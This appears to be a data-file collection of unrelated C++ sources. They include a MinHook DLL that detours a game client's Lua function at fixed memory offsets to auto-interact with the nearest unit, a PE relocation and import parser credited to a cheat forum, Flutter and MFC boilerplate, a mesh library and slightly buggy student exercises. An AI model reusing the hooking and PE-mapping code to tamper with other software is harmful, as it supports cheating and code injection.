    "\ufeff// dllmain.cpp : Defines the entry point for the DLL application.\n#include \"Game.h\"\n#include \"MinHook.h\"\n\n#include <cmath>\n\nLUA_CFUNCTION p_original_UnitXP = NULL;\nLUA_CFUNCTION p_UnitXP = reinterpret_cast<LUA_CFUNCTION>(Offsets::FUN_UNITXP);\n\nstatic float distance3D(C3Vector v1, C3Vector v2) {\n    float dx = v2.x - v1.x;\n    float dy = v2.y - v1.y;\n    float dz = v2.z - v1.z;\n\n    return sqrt(dx * dx + dy * dy + dz * dz);\n}\n\nstatic uint32_t InteractNearest()\n{\n    if (!Game::IsInWorld()) return 0;\n\n    uint32_t objects = *reinterpret_cast<uint32_t*>(Offsets::VISIBLE_OBJECTS);\n    uint32_t currentObject = *reinterpret_cast<uint32_t*>(objects + 0xAC);\n    uint32_t candidate = -1;\n\n    uint64_t playerGUID = *reinterpret_cast<uint64_t*>(objects + 0xC0);\n    uint32_t player = Game::GetObjectPointer(playerGUID);\n\n    C3Vector pPos = Game::GetUnitPosition(player);\n    C3Vector oPos;\n\n    float bestDistance = 1000.0f;\n\n    while (currentObject != 0 && (currentObject & 1) == 0)\n    {\n        uint64_t guid = *reinterpret_cast<uint64_t*>(currentObject + 0x30);\n        uint32_t pointer = Game::GetObjectPointer(guid);\n        uint32_t type = *reinterpret_cast<uint32_t*>(pointer + 0x14);\n        uint64_t owner = *reinterpret_cast<uint64_t*>(*reinterpret_cast<uint32_t*>(pointer + 0x8) + 0x30);\n\n        if (owner == playerGUID)\n        {\n            currentObject = *reinterpret_cast<uint32_t*>(currentObject + 0x3C);\n            continue;\n        }\n\n        if (type == ObjectType::UNIT)\n        {\n            oPos = Game::GetUnitPosition(currentObject);\n        }\n        else if (type == ObjectType::GAMEOBJECT)\n        {\n            oPos = Game::GetObjectPosition(currentObject);\n        }\n        else\n        {\n            currentObject = *reinterpret_cast<uint32_t*>(currentObject + 0x3C);\n            continue;\n        }\n\n        float distance = distance3D(oPos, pPos);\n        if (distance <= 5.0 && distance < bestDistance)\n        {\n            if (type == ObjectType::UNIT)\n            {\n                if (Game::GetUnitHealth(currentObject) == 0 && (Game::IsUnitLootable(currentObject) || Game::IsUnitSkinnable(currentObject)))\n                {\n                    bestDistance = distance;\n                    candidate = currentObject;\n                }\n                else if (Game::GetUnitHealth(currentObject) > 0)\n                {\n                    bestDistance = distance;\n                    candidate = currentObject;\n                }\n            }\n            else if (type == ObjectType::GAMEOBJECT)\n            {\n                bestDistance = distance;\n                candidate = currentObject;\n            }\n        }\n\n        currentObject = *reinterpret_cast<uint32_t*>(currentObject + 0x3C);\n    }\n\n    if (candidate == -1) return 0;\n\n    uint64_t candidateGUID = *reinterpret_cast<uint64_t*>(candidate + 0x30);\n    int candidatePointer = Game::GetObjectPointer(candidateGUID);\n    uint32_t candidateType = *reinterpret_cast<uint32_t*>(candidatePointer + 0x14);\n\n    if (candidateType == ObjectType::UNIT)\n    {\n        Game::SetTarget(candidateGUID);\n        Game::Interact(candidate, Offsets::FUN_RIGHT_CLICK_UNIT);\n    }\n    else\n    {\n        Game::Interact(candidatePointer, Offsets::FUN_RIGHT_CLICK_OBJECT);\n    }\n\n    return 1;\n}\n\nint __fastcall detoured_UnitXP(void* L)\n{\n    if (Lua::GetTop(L) >= 2)\n    {\n        const char* arg = Lua::ToString(L, 1);\n        if (strcmp(arg, \"interact\") == 0)\n        {\n            InteractNearest();\n            return 1;\n        }\n    }\n    return p_original_UnitXP(L);\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)\n{\n    switch (ul_reason_for_call)\n    {\n        case DLL_PROCESS_ATTACH:\n            DisableThreadLibraryCalls(hModule);\n\n            if (MH_Initialize() != MH_OK)\n            {\n                return FALSE;\n            }\n\n            if (MH_CreateHook(p_UnitXP, &detoured_UnitXP, reinterpret_cast<LPVOID*>(&p_original_UnitXP)) != MH_OK)\n            {\n                return FALSE;\n            }\n\n            if (MH_EnableHook(p_UnitXP) != MH_OK)\n            {\n                return FALSE;\n            }\n\n            break;\n\n        case DLL_PROCESS_DETACH:\n            MH_Uninitialize();\n            break;\n    }\n\n    return TRUE;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"textformfield_filtering_data\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <string.h>\r\n\r\n#include \"Vertex.h\"\r\n#include \"HalfEdge.h\"\r\n#include \"Edge.h\"\r\n#include \"Face.h\"\r\n#include \"Solid.h\"\r\n#include <fstream>\r\n#include <assert.h>\r\n#include <vector>\r\n#include <algorithm>\r\n//#include \"map.h\"\r\n#include \"iterators.h\"\r\n\r\n#include \"TopologyException.h\"\r\n#include \"FException.h\"\r\n\r\n#include \"FaceNormalTrait.h\"\r\n\r\nusing namespace MeshLib;\r\n\r\n//!  Solid.\r\n/*!\r\n  This class define solid(mesh) structure.\r\n*/\r\nSolid::tFace Solid::createFace( int * v , int id )\r\n{\r\n\ttFace f = createFace( id );\t\t\r\n\t//create halfedges\r\n\ttHalfEdge hes[3];\r\n\r\n\r\n\tint i;\r\n\tfor( i = 0; i < 3; i ++ )\r\n\t{\r\n\t\thes[i] = new HalfEdge;\r\n\r\n\t\tVertex * vert =  idVertex( v[i] );\r\n\t\thes[i]->vertex() = vert;\r\n\t\tvert->halfedge() = hes[i];\r\n\t}\r\n\r\n\t//linking to each other\r\n\tfor( i = 0; i < 3; i ++ )\r\n\t{\r\n\t\thes[i]->he_next() = hes[(i+1)%3];\r\n\t\thes[i]->he_prev() = hes[(i+2)%3];\r\n\t}\r\n\r\n\t//linking to face\r\n\tfor( i = 0; i < 3; i ++ )\r\n\t{\r\n\t\thes[i]->face()   = f;\r\n\t\tf->halfedge()    = hes[i];\r\n\t}\r\n\r\n\t//connecting with edge\r\n\t//this part is modified: fix the constraint \" the target vertex id is \r\n\t//greater than the source vertex id of halfedge(0) with interior edge \"\r\n\tfor( i = 0; i < 3; i ++ )\r\n\t{\r\n\t\ttEdge e = createEdge( v[i], v[(i+2)%3] );\r\n\t\tif( e->halfedge(0)  == NULL )\r\n\t\t{\r\n\t\t\te->halfedge(0) = hes[i];\r\n\t\t\thes[i]->edge() = e;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif( e->halfedge(1) != NULL ) throw TopologyException();\r\n\t\t\te->halfedge(1) = hes[i];\r\n\t\t\thes[i]->edge() = e;\r\n\t\t\t\r\n\t\t\tif( e->halfedge(0)->target()->id() < e->halfedge(0)->source()->id() )\r\n\t\t\t{\r\n\t\t\t\tHalfEdge * temp = e->halfedge(0);\r\n\t\t\t\te->halfedge(0 ) = e->halfedge(1);\r\n\t\t\t\te->halfedge(1 ) = temp;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\r\n\t}\r\n\r\n\treturn f;\r\n};\r\n//this function should always be the last to execute\r\n//the vertex should always be isolated before destroy\r\nvoid Solid::destroyVertex(Vertex * vertex)\r\n{\r\n    assert(vertex->halfedge () == NULL);\r\n\tassert(vertex->trait () == NULL);\r\n\r\n\tm_verts.remove (vertex);\r\n    delete vertex;\r\n}\r\n\r\n//note this detroy will generate isolated vertex\r\nvoid Solid::destroyEdge (Edge * edge)\r\n{\r\n\tassert(edge->halfedge (0) == NULL && edge->halfedge (1) == NULL);\r\n\tassert(edge->trait () == NULL);\r\n\tm_edges.remove (edge);\r\n\tdelete edge;\r\n}\r\n\r\n//note this function also can not manipulate the generation of isolated vertex\r\n//this function assume no vertex has link to the halfedge to be destroyed\r\nvoid Solid::destroyHalfEdge(HalfEdge * he)\r\n{\r\n\tassert(he->target ()->halfedge () != he);\r\n\tassert(he->trait () == NULL);\r\n\tHalfEdge * hes = he->he_sym ();\r\n\tif(hes != NULL){\r\n\t\thes->he_sym () = NULL;\r\n\t\tif(hes == hes->edge ()->halfedge (1)){\r\n\t\t\tEdge * e = hes->edge ();\r\n\t\t\te->halfedge (0) = hes;\r\n\t\t\te->halfedge (1) = NULL;\r\n\t\t}\r\n\t}\r\n\telse{\r\n\t\tEdge * e = he->edge ();\r\n\t\te->halfedge (0) = NULL;\r\n\t\te->halfedge (1) = NULL;\r\n\t\tdestroyEdge(e);\r\n\t}\r\n\tHalfEdge * hep = he->he_prev ();\r\n\tHalfEdge * hen = he->he_next ();\r\n\tif(hep!= NULL) hep->he_next () = NULL;\r\n\tif(hen!= NULL) hen->he_prev () = NULL;\r\n\tif(he->face ()->halfedge () == he)\r\n\t\the->face ()->halfedge () = he->he_next ();\r\n\tdelete he;\r\n}\r\n\r\n//this will happen only after all the halfedge on the face is deleted\r\nvoid Solid::destroyFace (Face * face)\r\n{\r\n\tassert(face->trait () == NULL);\r\n\tHalfEdge * he = face->halfedge ();\r\n\tfor(int i=0; i<3; i++){\r\n\t\tHalfEdge * hen = he->he_next ();\r\n\t\tassert(he->target ()->halfedge () == NULL || he->target ()->halfedge ()->face () != face);\r\n\t\tdestroyHalfEdge(he);\r\n\t\the = hen;\r\n\t}\r\n\tassert(face->halfedge () == NULL);\r\n\tm_faces.remove (face);\r\n\tdelete face;\r\n}\r\n\r\n\r\nvoid Solid::collapseEdge (Edge * edge)\r\n{\r\n\tcollapseEdgeVertex(edge,edge->halfedge (0)->source () );\r\n}\r\n\r\nbool Solid::collapsable (HalfEdge * halfedge)\r\n{\r\n\tEdge * edge = halfedge->edge ();\r\n\tVertex * source = halfedge->source ();\r\n\tVertex * target = halfedge->target ();\r\n\tFace * fL = halfedge->face ();\r\n\tFace * fR = halfedge->he_sym ()!= NULL?halfedge->he_sym()->face ():NULL;\r\n\tVertex * vL = halfedge->he_next ()->target ();\r\n\tVertex * vR = halfedge->he_sym ()!= NULL? halfedge->he_sym ()->he_next ()->target ():NULL;\r\n\tstd::vector <HalfEdge *> thlist;\r\n\tfor( VertexInHalfedgeIterator vhiter( this, target );!vhiter.end(); ++ vhiter )\r\n\t{\r\n\t\tHalfEdge * he = *vhiter;\r\n\r\n\t\tif( he->face() == fL ) continue;\r\n\t\tif( he->face() == fR ) continue;\r\n\r\n\t\tthlist.push_back ( he );\r\n\t}\r\n\r\n\tfor( VertexInHalfedgeIterator svhiter( this, source );!svhiter.end(); ++ svhiter )\r\n\t{\r\n\t\tHalfEdge * he = *svhiter;\r\n\r\n\t\tif( he->face() == fL ) continue;\r\n\t\tif( he->face() == fR ) continue;\r\n\r\n\t\tthlist.push_back ( he );\r\n\t}\r\n\tif(thlist.size () == 0) return false;\r\n\r\n\tthlist.clear ();\r\n\tfor( VertexInHalfedgeIterator lvhiter( this, vL );!lvhiter.end(); ++ lvhiter )\r\n\t{\r\n\t\tHalfEdge * he = *lvhiter;\r\n\r\n\t\tif( he->face() == fL ) continue;\r\n\t\tif( he->face() == fR ) continue;\r\n\r\n\t\tthlist.push_back ( he );\r\n\t}\r\n\tif(thlist.size () == 0) return false;\r\n\tif( vR != NULL )\r\n\t{\r\n\t\tthlist.clear ();\r\n\t\tfor( VertexInHalfedgeIterator rvhiter( this, vR );!rvhiter.end(); ++ rvhiter )\r\n\t",
    "#include \"portable_executable.hpp\"\r\n\r\nPIMAGE_NT_HEADERS64 portable_executable::GetNtHeaders(void* image_base)\r\n{\r\n\tconst auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image_base);\r\n\r\n\tif (dos_header->e_magic != IMAGE_DOS_SIGNATURE)\r\n\t\treturn nullptr;\r\n\r\n\tconst auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uint64_t>(image_base) + dos_header->e_lfanew);\r\n\r\n\tif (nt_headers->Signature != IMAGE_NT_SIGNATURE)\r\n\t\treturn nullptr;\r\n\r\n\treturn nt_headers;\r\n}\r\n\r\nportable_executable::vec_relocs portable_executable::GetRelocs(void* image_base)\r\n{\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);\r\n\r\n\tif (!nt_headers)\r\n\t\treturn {};\r\n\r\n\tvec_relocs relocs;\r\n\tDWORD reloc_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;\r\n\r\n\tif (!reloc_va) //Fix from @greetmark of UnknownCheats Forum\r\n\t\treturn {};\r\n\r\n\tauto current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(image_base) + reloc_va);\r\n\tconst auto reloc_end = reinterpret_cast<uint64_t>(current_base_relocation) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;\r\n\r\n\twhile (current_base_relocation->VirtualAddress && current_base_relocation->VirtualAddress < reloc_end && current_base_relocation->SizeOfBlock)\r\n\t{\r\n\t\tRelocInfo reloc_info;\r\n\r\n\t\treloc_info.address = reinterpret_cast<uint64_t>(image_base) + current_base_relocation->VirtualAddress;\r\n\t\treloc_info.item = reinterpret_cast<uint16_t*>(reinterpret_cast<uint64_t>(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));\r\n\t\treloc_info.count = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);\r\n\r\n\t\trelocs.push_back(reloc_info);\r\n\r\n\t\tcurrent_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + current_base_relocation->SizeOfBlock);\r\n\t}\r\n\r\n\treturn relocs;\r\n}\r\n\r\nportable_executable::vec_imports portable_executable::GetImports(void* image_base)\r\n{\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);\r\n\r\n\tif (!nt_headers)\r\n\t\treturn {};\r\n\r\n\tvec_imports imports;\r\n\r\n\tauto current_import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uint64_t>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\r\n\r\n\twhile (current_import_descriptor->FirstThunk)\r\n\t{\r\n\t\tImportInfo import_info;\r\n\r\n\t\timport_info.module_name = std::string(reinterpret_cast<char*>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->Name));\r\n\r\n\t\tauto current_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->FirstThunk);\r\n\t\tauto current_originalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->OriginalFirstThunk);\r\n\r\n\t\twhile (current_originalFirstThunk->u1.Function)\r\n\t\t{\r\n\t\t\tImportFunctionInfo import_function_data;\r\n\r\n\t\t\tauto thunk_data = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<uint64_t>(image_base) + current_originalFirstThunk->u1.AddressOfData);\r\n\r\n\t\t\timport_function_data.name = thunk_data->Name;\r\n\t\t\timport_function_data.address = &current_first_thunk->u1.Function;\r\n\r\n\t\t\timport_info.function_datas.push_back(import_function_data);\r\n\r\n\t\t\t++current_originalFirstThunk;\r\n\t\t\t++current_first_thunk;\r\n\t\t}\r\n\r\n\t\timports.push_back(import_info);\r\n\t\t++current_import_descriptor;\r\n\t}\r\n\r\n\treturn imports;\r\n}",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint a, b;\r\nchar c;\r\nint month[12] = {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};\r\n\r\nvoid t1(){\r\n    cin >> a;\r\n    cout << \"hex\" << a;\r\n}\r\nvoid t2(){\r\n    cin >> c;\r\n    switch(c){\r\n        case '.': cout << \"\u0442\u043e\u0447\u043a\u0430\"; break;\r\n        case ',': cout << \"\u0437\u0430\u043f\u044f\u0442\u0430\u044f\"; break;\r\n        case '-': cout << \"\u0442\u0438\u0440\u0435\"; break;\r\n        case '?': cout << \"\u0437\u043d\u0430\u043a \u0432\u043e\u043f\u0440\u043e\u0441\u0430\"; break;\r\n        case '!': cout << \"\u0432\u043e\u0441\u043a\u043b\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u0437\u043d\u0430\u043a\"; break;\r\n        case ':': cout << \"\u0434\u0432\u043e\u0435\u0442\u043e\u0447\u0438\u0435\"; break;\r\n        case ';': cout << \"\u0442\u043e\u0447\u043a\u0430 \u0441 \u0437\u0430\u043f\u044f\u0442\u043e\u0439\"; break;\r\n        case '...': cout << \"\u043c\u043d\u043e\u0433\u043e\u0442\u043e\u0447\u0438\u0435\"; break;\r\n        default: cout << \"\u043a\u0430\u043a\u043e\u0439-\u0442\u043e \u0441\u0438\u043c\u0432\u043e\u043b\";\r\n    }\r\n}\r\nvoid t3(){\r\n    cin >> a;\r\n    switch(a){\r\n        case 1: cout << \"I\"; break;\r\n        case 5: cout << \"V\"; break;\r\n        case 10: cout << \"X\"; break;\r\n        case 50: cout << \"L\"; break;\r\n        case 500: cout << \"D\"; break;\r\n    }\r\n}\r\n\r\nvoid t4(){\r\n    cin >> a;\r\n    switch(a){\r\n        case 1: cout << 31+31+28; break;\r\n        case 2: cout << 31+30+31; break;\r\n        case 3: cout << 30+31+31; break;\r\n        case 4: cout << 30+31+30; break;\r\n        default: cout << \"\u0422\u0430\u043a\u043e\u0433\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438 \u0433\u043e\u0434\u0430 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442\";\r\n    }\r\n}\r\n\r\nvoid t5(){\r\n    cin >> a >> b;\r\n    switch(b){\r\n        case 1: cout << a; break;\r\n        case 2: cout << a*0.000001; break;\r\n        case 3: cout << a*1.0/1000; break;\r\n        case 4: cout << a*1000; break;\r\n        case 5: cout << a*100; break;\r\n    }\r\n}\r\n\r\nvoid t6(){\r\n    cin >> a;\r\n    switch(a%7){\r\n        case 0: cout << \"\u0432\u0441\"; break;\r\n        case 1: cout << \"\u043f\u043d\"; break;\r\n        case 2: cout << \"\u0432\u0442\"; break;\r\n        case 3: cout << \"\u0441\u0440\"; break;\r\n        case 4: cout << \"\u0447\u0442\"; break;\r\n        case 5: cout << \"\u043f\u0442\"; break;\r\n        default: cout << \"\u0441\u0431\"; break;\r\n    }\r\n}\r\n\r\nvoid t7(){\r\n    cin >> a;\r\n    string str;\r\n    switch(a){\r\n        case 1: str = \"\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443\"; break;\r\n        case 2: str = \"\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\"; break;\r\n        case 3: str = \"\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\"; break;\r\n        case 4: str = \"\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\"; break;\r\n        default: str = \"\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\";\r\n    }\r\n    cout << \"\u042f \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0430\u043b \" << a << \" \" << str << endl;\r\n}\r\n\r\nvoid t8(){\r\n    cin >> a >> b;\r\n    if(b>0 && b<13 && a>0 && a<=31){\r\n        if(a<30){\r\n            cout << \"Correct\" << endl;\r\n        }else if(a==30 && b!=2){\r\n            cout << \"Correct\" << endl;\r\n        }else if(a==31 && month[b]!=30){\r\n            cout << \"Correct\" << endl;\r\n        }\r\n    }else{\r\n        cout << \"Wrong date\";\r\n    }\r\n}\r\n\r\nvoid t9(){\r\n    cin >> a >> b;\r\n    cin >> c;\r\n    switch(c){\r\n        case '+': cout << a+b; break;\r\n        case '-': cout << a-b; break;\r\n        case '*': cout << a*b; break;\r\n        case '/': cout << a/b; break;\r\n        default: cout << \"Error\";\r\n    }\r\n}\r\n\r\nvoid t10(){\r\n    cin >> a;\r\n    cin >> b;\r\n    switch(b){\r\n        case 1: cout << a*1024*1024*8; break;\r\n        case 2: cout << a*1024*1024; break;\r\n        case 3: cout << a*1024; break;\r\n        case 4: cout << a; break;\r\n        default: cout << a/1024;\r\n    }\r\n}\r\n\r\nvoid t11(){\r\n    cin >> a;\r\n    if(a < 0){\r\n        cout << \"\u043c\u0438\u043d\u0443\u0441 \";\r\n    }\r\n    switch(a){\r\n        case 1: cout << \"\u043e\u0434\u0438\u043d\"; break;\r\n        case 2: cout << \"\u0434\u0432\u0430\"; break;\r\n        case 3: cout << \"\u0442\u0440\u0438\"; break;\r\n        case 4: cout << \"\u0447\u0435\u0442\u044b\u0440\u0435\"; break;\r\n        default: cout << \"\u043f\u044f\u0442\u044c\";\r\n    }\r\n}\r\n\r\nint main(){\r\n    setlocale(LC_ALL, \"rus\");\r\n\r\n    int task;\r\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0437\u0430\u0434\u0430\u0447\u0438: \\n\";\r\n    cin >> task;\r\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0430\u043d\u043d\u044b\u0435: \\n\";\r\n\r\n    switch(task){\r\n        case 1: t1(); break;\r\n        case 2: t2(); break;\r\n        case 3: t3(); break;\r\n        case 4: t4(); break;\r\n        case 5: t5(); break;\r\n        case 6: t6(); break;\r\n        case 7: t7(); break;\r\n        case 8: t8(); break;\r\n        case 9: t9(); break;\r\n        case 10: t10(); break;\r\n        default: t11();\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"carsle\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff\n// MainFrm.cpp: CMainFrame \u7c7b\u7684\u5b9e\u73b0\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"MFCApplication1.h\"\n\n#include \"MainFrm.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n// CMainFrame\n\nIMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)\n\nBEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)\n\tON_WM_CREATE()\nEND_MESSAGE_MAP()\n\nstatic UINT indicators[] =\n{\n\tID_SEPARATOR,           // \u72b6\u6001\u884c\u6307\u793a\u5668\n\tID_INDICATOR_CAPS,\n\tID_INDICATOR_NUM,\n\tID_INDICATOR_SCRL,\n};\n\n// CMainFrame \u6784\u9020/\u6790\u6784\n\nCMainFrame::CMainFrame() noexcept\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u6210\u5458\u521d\u59cb\u5316\u4ee3\u7801\n}\n\nCMainFrame::~CMainFrame()\n{\n}\n\nint CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)\n{\n\tif (CFrameWnd::OnCreate(lpCreateStruct) == -1)\n\t\treturn -1;\n\n\tif (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP | CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||\n\t\t!m_wndToolBar.LoadToolBar(IDR_MAINFRAME))\n\t{\n\t\tTRACE0(\"\u672a\u80fd\u521b\u5efa\u5de5\u5177\u680f\\n\");\n\t\treturn -1;      // \u672a\u80fd\u521b\u5efa\n\t}\n\n\tif (!m_wndStatusBar.Create(this))\n\t{\n\t\tTRACE0(\"\u672a\u80fd\u521b\u5efa\u72b6\u6001\u680f\\n\");\n\t\treturn -1;      // \u672a\u80fd\u521b\u5efa\n\t}\n\tm_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT));\n\n\t// TODO: \u5982\u679c\u4e0d\u9700\u8981\u53ef\u505c\u9760\u5de5\u5177\u680f\uff0c\u5219\u5220\u9664\u8fd9\u4e09\u884c\n\tm_wndToolBar.EnableDocking(CBRS_ALIGN_ANY);\n\tEnableDocking(CBRS_ALIGN_ANY);\n\tDockControlBar(&m_wndToolBar);\n\n\n\treturn 0;\n}\n\nBOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)\n{\n\tif( !CFrameWnd::PreCreateWindow(cs) )\n\t\treturn FALSE;\n\t// TODO: \u5728\u6b64\u5904\u901a\u8fc7\u4fee\u6539\n\t//  CREATESTRUCT cs \u6765\u4fee\u6539\u7a97\u53e3\u7c7b\u6216\u6837\u5f0f\n\n\treturn TRUE;\n}\n\n// CMainFrame \u8bca\u65ad\n\n#ifdef _DEBUG\nvoid CMainFrame::AssertValid() const\n{\n\tCFrameWnd::AssertValid();\n}\n\nvoid CMainFrame::Dump(CDumpContext& dc) const\n{\n\tCFrameWnd::Dump(dc);\n}\n#endif //_DEBUG\n\n\n// CMainFrame \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\n\n",
    "\ufeff#include \"ImGuiManager.h\"\n\n#ifdef _DEBUG\n#include \"DirectXCommon.h\"\n#include \"WinApp.h\"\n#include <imgui_impl_dx12.h>\n#include <imgui_impl_win32.h>\n#endif\n\nImGuiManager* ImGuiManager::GetInstance() {\n\tstatic ImGuiManager instance;\n\treturn &instance;\n}\n\nvoid ImGuiManager::Initialize(\n    [[maybe_unused]] WinApp* winApp, [[maybe_unused]] DirectXCommon* dxCommon) {\n#ifdef _DEBUG\n\tHRESULT result;\n\n\tdxCommon_ = dxCommon;\n\n\t// \u30c7\u30b9\u30af\u30ea\u30d7\u30bf\u30d2\u30fc\u30d7\u8a2d\u5b9a\n\tD3D12_DESCRIPTOR_HEAP_DESC desc = {};\n\tdesc.Type = D3D12_DESCRIPTOR_HEAP_TYPE_CBV_SRV_UAV;\n\tdesc.NumDescriptors = 1;\n\tdesc.Flags = D3D12_DESCRIPTOR_HEAP_FLAG_SHADER_VISIBLE;\n\t// \u30c7\u30b9\u30af\u30ea\u30d7\u30bf\u30d2\u30fc\u30d7\u751f\u6210\n\tresult = dxCommon_->GetDevice()->CreateDescriptorHeap(&desc, IID_PPV_ARGS(&srvHeap_));\n\tassert(SUCCEEDED(result));\n\tsrvHeap_->SetName(L\"ImGui_DescriptorHeap\");\n\n\t// ImGui\u306e\u30b3\u30f3\u30c6\u30ad\u30b9\u30c8\u3092\u751f\u6210\n\tImGui::CreateContext();\n\t// ImGui\u306e\u30b9\u30bf\u30a4\u30eb\u3092\u8a2d\u5b9a\n\tImGui::StyleColorsDark();\n\t// \u30d7\u30e9\u30c3\u30c8\u30d5\u30a9\u30fc\u30e0\u3068\u30ec\u30f3\u30c0\u30e9\u30fc\u306e\u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u3092\u8a2d\u5b9a\u3059\u308b\n\tImGui_ImplWin32_Init(winApp->GetHwnd());\n\tImGui_ImplDX12_Init(\n\t    dxCommon_->GetDevice(), static_cast<int>(dxCommon_->GetBackBufferCount()),\n\t    DXGI_FORMAT_R8G8B8A8_UNORM_SRGB, srvHeap_.Get(),\n\t    srvHeap_->GetCPUDescriptorHandleForHeapStart(),\n\t    srvHeap_->GetGPUDescriptorHandleForHeapStart());\n\n\tImGuiIO& io = ImGui::GetIO();\n\t// \u6a19\u6e96\u30d5\u30a9\u30f3\u30c8\u3092\u8ffd\u52a0\u3059\u308b\n\tio.Fonts->AddFontDefault();\n#endif\n}\n\nvoid ImGuiManager::Finalize() {\n#ifdef _DEBUG\n\t// \u5f8c\u59cb\u672b\n\tImGui_ImplDX12_Shutdown();\n\tImGui_ImplWin32_Shutdown();\n\tImGui::DestroyContext();\n\n\t// 